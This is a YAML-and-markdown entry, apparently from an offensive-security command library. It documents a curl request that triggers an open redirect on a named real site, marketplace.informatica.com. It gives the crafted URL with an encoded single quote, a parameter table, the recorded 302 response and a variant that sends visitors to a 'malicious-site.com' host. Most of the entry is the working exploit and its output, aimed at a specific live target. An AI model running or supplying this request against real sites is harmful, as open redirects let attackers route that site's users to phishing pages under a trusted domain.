---
id: 123e4567-e89b-12d3-a456-426614174002
name: http-get-trigger-open-redirect
type: command
executor: bash
data: >-
  curl -X GET 'https://marketplace.informatica.com//google.com?q=ohdear&a%27b'
  -H 'Host: marketplace.informatica.com' -H 'Connection: close' -i
output: >-
  HTTP/1.0 302 Found\nLocation: //google.com?q=ohdear&a\nServer:
  BigIP\nConnection: close\nContent-Length: 0
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:26.216Z'
platforms:
  - Web
tags:
  - open-redirect
  - http-request
verified: false
validated: true
submitted: true
---

# http-get-trigger-open-redirect

## Command

```bash
curl -X GET 'https://marketplace.informatica.com//google.com?q=ohdear&a%27b' -H 'Host: marketplace.informatica.com' -H 'Connection: close' -i
```

## Description

This command sends an HTTP GET request to a crafted URL on marketplace.informatica.com containing a URL-encoded single quote (%27) in the path. It triggers the open redirect vulnerability by exploiting the flawed URL rewrite rule, resulting in a 302 redirect to a protocol-relative external URL. Use this to test and demonstrate the vulnerability in web applications.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method as GET | Yes |
| `'https://marketplace.informatica.com//google.com?q=ohdear&a%27b'` | The crafted URL with single quote in path (encode %27 for transport) | Yes |
| `-H 'Host: marketplace.informatica.com'` | Sets the Host header to the target domain | Yes |
| `-H 'Connection: close'` | Closes the connection after the request | No |
| `-i` | Includes response headers in output | Yes |

## Examples

### Basic Usage

```bash
curl -X GET 'https://marketplace.informatica.com//google.com?q=ohdear&a%27b' -H 'Host: marketplace.informatica.com' -H 'Connection: close' -i
```

### Advanced Usage

```bash
curl -X GET 'https://marketplace.informatica.com//malicious-site.com/path%27test' -H 'Host: marketplace.informatica.com' -H 'Connection: close' -L -i
```

This follows the redirect (-L) to the malicious site for full simulation.

## Expected Output

A 302 Found response with a Location header pointing to the stripped URL (e.g., //google.com?q=ohdear&a), served by BigIP, confirming the redirect without the single quote.

## Related

- [[Related Procedure|procedures/Trigger-Open-Redirect-with-Single-Quote]]
